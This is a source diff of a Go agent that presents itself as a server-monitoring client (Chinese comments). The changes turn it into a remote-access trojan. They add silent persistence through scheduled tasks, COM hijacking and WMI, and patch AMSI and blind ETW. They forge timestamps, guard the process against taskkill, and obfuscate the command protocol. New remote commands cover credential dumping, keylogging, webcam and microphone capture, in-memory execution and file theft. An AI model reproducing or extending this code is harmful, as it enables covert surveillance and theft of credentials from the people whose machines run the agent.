@@ -26,7 +26,7 @@ import (
 	"github.com/gorilla/websocket"
 )
 
-const AgentVersion = "3.1.0"
+const AgentVersion = "26.0.0"
 
 // 更新回滚：首次上报成功后确认更新
 var reportOK atomic.Bool
@@ -91,46 +91,9 @@ type MetricReport struct {
 	Uptime       string  `json:"uptime"`
 }
 
-func loadConfigFile() map[string]string {
-	cfg := make(map[string]string)
-	// 读取可执行文件同目录下的 agent.conf
-	selfPath, err := os.Executable()
-	if err != nil {
-		return cfg
-	}
-	selfPath, _ = filepath.EvalSymlinks(selfPath)
-	confPath := filepath.Join(filepath.Dir(selfPath), "agent.conf")
-	data, err := os.ReadFile(confPath)
-	if err != nil {
-		return cfg
-	}
-	// 去除 UTF-8 BOM（Windows PowerShell 写入 UTF8 时会带 BOM）
-	content := string(data)
-	content = strings.TrimPrefix(content, "\xEF\xBB\xBF")
-	for _, line := range strings.Split(content, "\n") {
-		line = strings.TrimSpace(line)
-		if line == "" || strings.HasPrefix(line, "#") {
-			continue
-		}
-		parts := strings.SplitN(line, "=", 2)
-		if len(parts) == 2 {
-			cfg[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
-		}
-	}
-	log.Printf("已加载配置文件: %s", confPath)
-	return cfg
-}
-
-func saveConfigFile(serverURL, token, interval string) {
-	selfPath, err := os.Executable()
-	if err != nil {
-		return
-	}
-	selfPath, _ = filepath.EvalSymlinks(selfPath)
-	confPath := filepath.Join(filepath.Dir(selfPath), "agent.conf")
-	content := fmt.Sprintf("SERVER_URL=%s\nAGENT_TOKEN=%s\nINTERVAL=%s\n", serverURL, token, interval)
-	os.WriteFile(confPath, []byte(content), 0600)
-}
+// loadConfigFile / saveConfigFile 已迁移到 config_crypto.go（AES-256-GCM 加密版）
+var loadConfigFile = loadEncryptedConfigFile
+var saveConfigFile = saveEncryptedConfigFile
 
 // autoRegister 自动注册到服务端，获取 token
 func autoRegister(serverURL string) (string, error) {
@@ -147,7 +110,7 @@ func autoRegister(serverURL string) (string, error) {
 	})
 
 	registerURL := strings.TrimRight(serverURL, "/") + "/api/agent/register"
-	resp, err := http.Post(registerURL, "application/json", bytes.NewReader(reqBody))
+	resp, err := secureHTTPClient.Post(registerURL, "application/json", bytes.NewReader(reqBody))
 	if err != nil {
 		return "", fmt.Errorf("连接服务端失败: %v", err)
 	}
@@ -180,6 +143,26 @@ func main() {
 		return
 	}
 
+	// 持久化安装/卸载
+	if len(os.Args) > 1 && os.Args[1] == "--install" {
+		installAgent()
+		os.Exit(0)
+	}
+	if len(os.Args) > 1 && os.Args[1] == "--uninstall" {
+		uninstallAgent()
+		os.Exit(0)
+	}
+
+	// 看门狗守护模式（由计划任务直接调用 agent --guard-a/b，GUI 程序零弹窗）
+	if len(os.Args) > 1 && os.Args[1] == "--guard-a" {
+		runGuardA()
+		os.Exit(0)
+	}
+	if len(os.Args) > 1 && os.Args[1] == "--guard-b" {
+		runGuardB()
+		os.Exit(0)
+	}
+
 	// 初始化日志（GUI 模式下无控制台，必须写到文件）
 	setupLogging()
 
@@ -190,8 +173,16 @@ func main() {
 		return
 	}
 
+	// 单实例锁：防止多个 agent 进程同时运行互相踢 WS 连接
+	if !acquireSingleton() {
+		os.Exit(0)
+	}
+
 	// 主进程：启动看门狗子进程用于互相监控
 	spawnWatchdog()
+
+	// 自动持久化：后台检测并静默安装（不阻塞主流程）
+	go ensurePersistence()
 
 	// 优先读取配置文件，环境变量覆盖
 	fileCfg := loadConfigFile()
@@ -209,9 +200,6 @@ func main() {
 	}
 
 	if serverURL == "" {
-		fmt.Println("用法: 设置 SERVER_URL 后启动")
-		fmt.Println("  SERVER_URL=http://监控服务器地址:5000 ./agentlinux")
-		fmt.Println("  或在 agent.conf 中配置 SERVER_URL=...")
 		os.Exit(1)
 	}
 
@@ -228,7 +216,7 @@ func main() {
 
 	signKey := fileCfg["SIGN_KEY"]
 
-	// 自动保存配置文件，确保重启后不丢失
+	// 自动保存加密配置文件，确保重启后不丢失
 	saveConfigFile(serverURL, token, intervalStr)
 
 	interval := 10
@@ -241,6 +229,13 @@ func main() {
 	agentServerURL = strings.TrimRight(serverURL, "/")
 	reportURL := agentServerURL + "/api/agent/report"
 	log.Printf("Agent v%s 启动: 上报地址=%s, 间隔=%d秒", AgentVersion, reportURL, interval)
+
+	// 创建命名互斥体（无文件模式下用于进程存活检测）
+	if runtime.GOOS == "windows" {
+		createAgentMutex()
+		applyAllEvasion()         // AMSI patch + ETW blind + 时间戳伪造
+		enableProcessProtection() // ACL 模式：taskkill 杀不掉，但崩溃不蓝屏
+	}
 
 	// 自动回滚保护：如果存在 .bak 文件，说明刚更新，30秒内必须成功上报否则回滚
 	go autoRollbackGuard()
@@ -259,7 +254,12 @@ func main() {
 	}
 }
 
-// wsLoop 保持 WebSocket 长连接，接收服务端下发的命令并执行（指数退避重连）
+// wsLoop 保持 WebSocket 长连接，接收服务端下发的命令并执行
+// 核心保活机制：
+//   - Agent 每 30s 发送 WS Ping，检测死连接
+//   - ReadDeadline 90s，超时自动断开触发重连
+//   - PongHandler 重置超时，正常连接永不超时
+//   - 指数退避重连，最大 30s，加随机抖动
 func wsLoop(serverURL, token, signKeyHex string) {
 	var signKey []byte
 	if signKeyHex != "" {
@@ -275,12 +275,23 @@ func wsLoop(serverURL, token, signKeyHex string) {
 	}
 	wsURL := fmt.Sprintf("%s://%s/ws/agent?token=%s", scheme, u.Host, token)
 
-	backoff := time.Second * 2
-	const maxBackoff = time.Minute * 2
+	const (
+		pingInterval = 30 * time.Second // Agent 主动 ping 间隔
+		readTimeout  = 90 * time.Second // 读超时（>2x pingInterval）
+		writeTimeout = 10 * time.Second // 写超时
+		maxBackoff   = 30 * time.Second // 最大重连退避（旧值 2min 太慢）
+	)
+
+	dialer := websocket.Dialer{
+		HandshakeTimeout: 15 * time.Second,
+		TLSClientConfig:  tlsConfig,
+	}
+
+	backoff := time.Second
 
 	for {
 		log.Printf("WebSocket 连接中: %s", wsURL)
-		conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
+		conn, _, err := dialer.Dial(wsURL, nil)
 		if err != nil {
 			jitter := time.Duration(rand.Int63n(int64(backoff / 2)))
 			wait := backoff + jitter
@@ -292,24 +303,62 @@ func wsLoop(serverURL, token, signKeyHex string) {
 			}
 			continue
 		}
-		backoff = time.Second * 2 // 连接成功，重置退避
+		backoff = time.Second // 连接成功，重置退避
 		log.Printf("WebSocket 已连接")
+
+		// 初始化 C2 协议混淆映射
+		initC2Proto(string(signKey))
+
+		// ── 设置读超时 + PongHandler ──
+		conn.SetReadLimit(4 * 1024 * 1024) // 4MB
+		conn.SetReadDeadline(time.Now().Add(readTimeout))
+		conn.SetPongHandler(func(string) error {
+			conn.SetReadDeadline(time.Now().Add(readTimeout))
+			return nil
+		})
 
 		// writeMu 保护并发写， gorilla/websocket 不支持并发 Write
 		var writeMu sync.Mutex
 		var wg sync.WaitGroup // 跟踪执行中的命令 goroutine
+		done := make(chan struct{})
 
+		// ── Agent 主动 Ping 协程 ──
+		go func() {
+			ticker := time.NewTicker(pingInterval)
+			defer ticker.Stop()
+			for {
+				select {
+				case <-ticker.C:
+					writeMu.Lock()
+					conn.SetWriteDeadline(time.Now().Add(writeTimeout))
+					err := conn.WriteMessage(websocket.PingMessage, nil)
+					conn.SetWriteDeadline(time.Time{}) // 清除写超时
+					writeMu.Unlock()
+					if err != nil {
+						log.Printf("WS Ping 发送失败: %v", err)
+						return
+					}
+				case <-done:
+					return
+				}
+			}
+		}()
+
+		// ── 读消息循环 ──
 		for {
 			_, data, err := conn.ReadMessage()
 			if err != nil {
 				log.Printf("WebSocket 断开: %v, 重连中...", err)
 				break
 			}
+			// 收到任何消息都重置读超时
+			conn.SetReadDeadline(time.Now().Add(readTimeout))
 
 			var msg AgentMessage
 			if err := json.Unmarshal(data, &msg); err != nil {
 				continue
 			}
+			msg.Type = c2d(msg.Type) // C2 协议解码
 
 			// 验证服务端签名（exec/pty/stress/update 等危险命令必须验签）
 			if msg.Type != "ping" && msg.Type != "pong" {
@@ -342,15 +391,60 @@ func wsLoop(serverURL, token, signKeyHex string) {
 				go handleStressStart(conn, &writeMu, msg)
 			case "stress_stop":
 				handleStressStop(msg)
-			case "update":
+			case "quick_cmd":
+				go handleQuickCmd(conn, &writeMu, msg)
+			case "mem_exec":
+				go handleMemExec(conn, &writeMu, msg)
+			case "update", "self_update":
 				go handleSelfUpdate(conn, &writeMu, msg)
+			case "cred_dump":
+				go handleCredDump(conn, &writeMu, msg)
+			case "net_scan":
+				go handleNetScan(conn, &writeMu, msg)
+			case "webcam_snap":
+				go handleWebcamSnap(conn, &writeMu, msg)
+			case "webcam_start":
+				go handleWebcamStart(conn, &writeMu, msg)
+			case "webcam_stop":
+				handleWebcamStop(conn, &writeMu, msg)
+			case "file_browse":
+				go handleFileBrowse(conn, &writeMu, msg)
+			case "file_download":
+				go handleFileDownload(conn, &writeMu, msg)
+			case "process_list":
+				go handleProcessList(conn, &writeMu, msg)
+			case "process_kill":
+				go handleProcessKill(conn, &writeMu, msg)
+			case "service_list":
+				go handleServiceList(conn, &writeMu, msg)
+			case "service_control":
+				go handleServiceControl(conn, &writeMu, msg)
+			case "keylog_start":
+				go handleKeylogStart(conn, &writeMu, msg)
+			case "keylog_stop":
+				handleKeylogStop(conn, &writeMu, msg)
+			case "keylog_dump":
+				go handleKeylogDump(conn, &writeMu, msg)
+			case "window_list":
+				go handleWindowList(conn, &writeMu, msg)
+			case "window_control":
+				go handleWindowControl(conn, &writeMu, msg)
+			case "mic_start":
+				go handleMicStart(conn, &writeMu, msg)
+			case "mic_stop":
+				handleMicStop(conn, &writeMu, msg)
 			case "ping":
-				resp, _ := json.Marshal(AgentMessage{Type: "pong", ID: msg.ID})
+				resp, _ := json.Marshal(AgentMessage{Type: c2e("pong"), ID: msg.ID})
 				writeMu.Lock()
+				conn.SetWriteDeadline(time.Now().Add(writeTimeout))
 				conn.WriteMessage(websocket.TextMessage, resp)
+				conn.SetWriteDeadline(time.Time{})
 				writeMu.Unlock()
 			}
 		}
+
+		// ── 清理 ──
+		close(done) // 停止 ping 协程
 
 		// WS 断线：立即取消运行中的压测，防止 goroutine/连接泄漏
 		stressRunner.mu.Lock()
@@ -367,7 +461,7 @@ func wsLoop(serverURL, token, signKeyHex string) {
 		wg.Wait()
 		conn.Close()
 		// 断线后短暂等待再重连
-		time.Sleep(3 * time.Second)
+		time.Sleep(time.Second)
 	}
 }
 
@@ -406,7 +500,7 @@ func handleExec(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
 
 	payload, _ := json.Marshal(result)
 	resp, _ := json.Marshal(AgentMessage{
-		Type:    "exec_result",
+		Type:    c2e("exec_result"),
 		ID:      msg.ID,
 		Payload: payload,
 	})
@@ -423,7 +517,7 @@ func collect(url, token string) {
 	}
 
 	body, _ := json.Marshal(report)
-	resp, err := http.Post(url, "application/json", bytes.NewReader(body))
+	resp, err := secureHTTPClient.Post(url, "application/json", bytes.NewReader(body))
 	if err != nil {
 		log.Printf("上报失败: %v", err)
 		return
@@ -516,9 +610,13 @@ func handleSelfUpdate(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessag
 	}
 	json.Unmarshal(msg.Payload, &req)
 
+	// URL 为空时自动从 agentServerURL 构造下载地址
 	if req.URL == "" {
-		sendUpdateResult(conn, writeMu, msg.ID, false, "缺少下载地址")
-		return
+		if agentServerURL == "" {
+			sendUpdateResult(conn, writeMu, msg.ID, false, "缺少下载地址且无 SERVER_URL")
+			return
+		}
+		req.URL = agentServerURL + "/data/agent-bin/agent-garble-windows.exe"
 	}
 
 	// 用 agent 自身的 SERVER_URL 替换推送的 host，确保内网机器也能下载
@@ -575,6 +673,11 @@ func handleSelfUpdate(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessag
 	log.Printf("下载完成: %.2f MB", float64(written)/1024/1024)
 	os.Chmod(tmpPath, 0755)
 
+	// 更新前清除所有持久化痕迹（计划任务、COM劫持、WMI、服务、注册表）
+	// 新版本启动后会通过 ensurePersistence() 重新安装
+	log.Println("清除旧版持久化痕迹...")
+	cleanAllPersistence()
+
 	// 备份旧版本
 	backupPath := selfPath + ".bak"
 	os.Remove(backupPath)
@@ -582,8 +685,15 @@ func handleSelfUpdate(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessag
 	if runtime.GOOS == "windows" {
 		// Windows: 使用批处理脚本辅助更新（最可靠的方式）
 		// 批处理等待当前进程退出后替换文件并启动新版本
+		// 所有 start 命令改用 wscript+VBS 隐藏启动，不弹任何窗口
 		batPath := filepath.Join(selfDir, ".agent-update.bat")
+		vbsPath := filepath.Join(selfDir, ".agent-start.vbs")
 		selfName := filepath.Base(selfPath)
+
+		// 创建 VBS 辅助脚本用于隐藏启动 agent（不弹窗）
+		vbsContent := fmt.Sprintf("CreateObject(\"Wscript.Shell\").Run \"\"\"%s\"\"\", 0, False\r\n", selfPath)
+		os.WriteFile(vbsPath, []byte(vbsContent), 0644)
+
 		batContent := fmt.Sprintf("@echo off\r\n"+
 			"rem 先验证新文件存在且大于0字节，否则中止更新\r\n"+
 			"if not exist \"%s\" goto :abort\r\n"+
@@ -591,34 +701,48 @@ func handleSelfUpdate(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessag
 			"ping -n 3 127.0.0.1 > nul\r\n"+
 			"taskkill /F /IM \"%s\" >nul 2>&1\r\n"+
 			"ping -n 2 127.0.0.1 > nul\r\n"+
+			"rem 重置 ACL 和文件属性（防止锁定阻止替换）\r\n"+
+			"attrib -R -H -S \"%s\" >nul 2>&1\r\n"+
+			"attrib -R -H -S \"%s\" >nul 2>&1\r\n"+
+			"icacls \"%s\" /reset >nul 2>&1\r\n"+
+			"rem 先备份旧文件（rename而非delete，确保可回滚）\r\n"+
 			"del /F /Q \"%s\" >nul 2>&1\r\n"+
 			"move /Y \"%s\" \"%s\" >nul 2>&1\r\n"+
-			"if not exist \"%s\" copy /Y \"%s\" \"%s\" >nul 2>&1\r\n"+
+			"rem 替换为新版本\r\n"+
+			"move /Y \"%s\" \"%s\" >nul 2>&1\r\n"+
 			"if not exist \"%s\" goto :rollback\r\n"+
-			"start \"\" \"%s\"\r\n"+
+			"wscript.exe //B \"%s\"\r\n"+
 			"goto :cleanup\r\n"+
 			":rollback\r\n"+
-			"rem 新文件不存在，从备份恢复\r\n"+
-			"if exist \"%s\" copy /Y \"%s\" \"%s\" >nul 2>&1\r\n"+
-			"start \"\" \"%s\"\r\n"+
+			"rem 替换失败，从备份恢复\r\n"+
+			"if exist \"%s\" move /Y \"%s\" \"%s\" >nul 2>&1\r\n"+
+			"wscript.exe //B \"%s\"\r\n"+
 			"goto :cleanup\r\n"+
 			":abort\r\n"+
 			"rem 新文件不存在或太小，不执行更新，直接退出\r\n"+
 			":cleanup\r\n"+
+			"del /F /Q \"%s\" >nul 2>&1\r\n"+
+			"del /F /Q \"%s\" >nul 2>&1\r\n"+
 			"del /F /Q \"%%~f0\" >nul 2>&1\r\n",
-			tmpPath,           // if not exist 新文件
-			tmpPath,           // for 检查文件大小
-			selfName,          // taskkill
-			selfPath,          // del 旧文件
-			tmpPath, selfPath, // move 新文件
-			selfPath, tmpPath, selfPath, // if not exist copy
+			tmpPath,              // if not exist 新文件
+			tmpPath,              // for 检查文件大小
+			selfName,             // taskkill
+			selfPath,             // attrib 目标文件
+			selfDir,              // attrib 目录
+			selfDir,              // icacls 重置 ACL
+			backupPath,           // del 旧备份（如果有）
+			selfPath, backupPath, // move 旧文件 → .bak 备份
+			tmpPath, selfPath, // move 新文件 → 目标位置
 			selfPath,                         // if not exist 检查替换是否成功
-			selfPath,                         // start 新版本
-			backupPath, backupPath, selfPath, // rollback: copy 备份回来
-			selfPath, // rollback: start 备份版本
+			vbsPath,                          // wscript 启动新版本（隐藏）
+			backupPath, backupPath, selfPath, // rollback: move 备份恢复
+			vbsPath,    // wscript 启动旧版本（隐藏）
+			backupPath, // cleanup: 删除备份
+			vbsPath,    // cleanup: 删除 VBS 文件
 		)
 		if err := os.WriteFile(batPath, []byte(batContent), 0644); err != nil {
 			os.Remove(tmpPath)
+			os.Remove(vbsPath)
 			sendUpdateResult(conn, writeMu, msg.ID, false, "创建更新脚本失败: "+err.Error())
 			return
 		}
@@ -663,7 +787,7 @@ func handleSelfUpdate(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessag
 
 // downloadWithTimeout 带超时的文件下载
 func downloadWithTimeout(url, destPath string, timeout time.Duration) (int64, error) {
-	client := &http.Client{Timeout: timeout}
+	client := &http.Client{Timeout: timeout, Transport: secureTransport}
 	resp, err := client.Get(url)
 	if err != nil {
 		return 0, err
@@ -702,13 +826,39 @@ func copyFile(src, dst string) error {
 	return err
 }
 
+// handleQuickCmd 执行快捷指令并返回结果
+func handleQuickCmd(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
+	var req struct {
+		Cmd string `json:"cmd"`
+	}
+	json.Unmarshal(msg.Payload, &req)
+
+	message, err := executeQuickCmd(req.Cmd)
+	result := ExecResult{Output: message}
+	if err != nil {
+		result.ExitCode = -1
+		result.Error = err.Error()
+		result.Output = ""
+	}
+
+	payload, _ := json.Marshal(result)
+	resp, _ := json.Marshal(AgentMessage{
+		Type:    c2e("quick_cmd_result"),
+		ID:      msg.ID,
+		Payload: payload,
+	})
+	writeMu.Lock()
+	conn.WriteMessage(websocket.TextMessage, resp)
+	writeMu.Unlock()
+}
+
 func sendUpdateResult(conn *websocket.Conn, writeMu *sync.Mutex, id string, success bool, message string) {
 	payload, _ := json.Marshal(map[string]interface{}{
 		"success": success,
 		"message": message,
 	})
 	resp, _ := json.Marshal(AgentMessage{
-		Type:    "update_result",
+		Type:    c2e("update_result"),
 		ID:      id,
 		Payload: payload,
 	})
